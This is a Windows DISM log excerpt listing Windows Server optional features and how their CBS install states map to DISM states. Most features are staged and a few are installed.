2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RightsManagementServicesManagementTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Security-SPP-Vmw with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WindowsServerBackup with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature File-Services-Search-Service with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FSRM-Management with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature iSCSITargetStorageProviders with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BITS with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature LightweightServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MultipathIo with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-PrintToPDFServices-Features with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DataCenterBridging with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SNMP with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WMISnmpProvider with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WindowsStorageManagementService with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Xps-Foundation-Xps-Viewer with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SMBBW with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature MSRDC-Infrastructure with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WINSRuntime with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RasCMAK with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Remote-Desktop-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SessionDirectory with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:40, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SBMgr-UI with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature AppServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature VmHostAgent with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NPAS-Role with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature OEM-Appliance-OOBE with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SearchEngine-Server-Package with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BitLocker-NetworkUnlock with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature CCFFilter with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FabricShieldedTools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FailoverCluster-AutomationServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FailoverCluster-CmdInterface with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FRS-Infrastructure with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ResumeKeyFilter with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SmbWitness with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Storage-Replica with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature iSCSITargetServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Licensing with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BiometricFramework with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SetupAndBootEventCollection with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerManager-Core-RSAT with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerManager-Core-RSAT-Role-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerManager-Core-RSAT-Feature-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:41, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ShieldedVMToolsAdminPack with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Storage-Replica-AdminPack with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DNS-Server-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RSAT-AD-Tools-Feature with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RSAT-ADDS-Tools-Feature with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DirectoryServices-DomainController-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DirectoryServices-ADAM-Tools with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Hyper-V with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Hyper-V-Offline with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Hyper-V-Online with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RSAT-Hyper-V-Tools-Feature with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Hyper-V-Management-Clients with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Hyper-V-Management-PowerShell with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature HostGuardian with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetworkVirtualization with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-GroupPolicy-ServerAdminTools-Update with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Windows-Internal-Database with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NetworkLoadBalancingFullServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature PeerDist with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature P2P-PnrpOnly with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature QWAVE with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RemoteAssistance with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature BitLocker with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Bitlocker-Utilities with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FailoverCluster-PowerShell with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServicesForNFS-ServerAndClient with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ClientForNFS-Infrastructure with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerForNFS-Infrastructure with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SMB1Protocol with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:42, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SMB1Protocol-Client with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SMB1Protocol-Server with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature TIFFIFilter with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WirelessNetworking with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Drivers-General with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Drivers-Printers with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Shell with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-Deployment-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-Deployment-Services-Transport-Server with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-Deployment-Services-Deployment-Server with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FaxServiceRole with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Gui-Mgmt with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Server-Gui-Mgmt_onecore with CBS state 0(CbsInstallStateAbsent) being mapped to dism state 0(DISM_INSTALL_STATE_NOTPRESENT) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature RSAT with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DfsMgmt with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FailoverCluster-Mgmt with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature NFS-Administration with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FaxServiceConfigRole with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Internet-Explorer-Optional-amd64 with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerMediaFoundation with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature WebDAV-Redirector with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature TelnetClient with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-LPRPortMonitor with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:43, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-InternetPrinting-Client with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Printing-AdminTools-Collection with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-MultiPoint-Connector with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-PhotoBasic with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-Printing-PremiumTools with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-StorageService with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FailoverCluster-FullServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Containers with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Containers-HNS with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Containers-SDN with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DiskIo-QoS with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerMigration with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SMBHashGeneration with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Dedup-Core with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DFSN-Server with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DFSR-Infrastructure-ServerEdition with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FileServerVSSAgent with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DHCPServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature DNS-Server-Full-Role with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature VolumeActivation-Full-Role with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
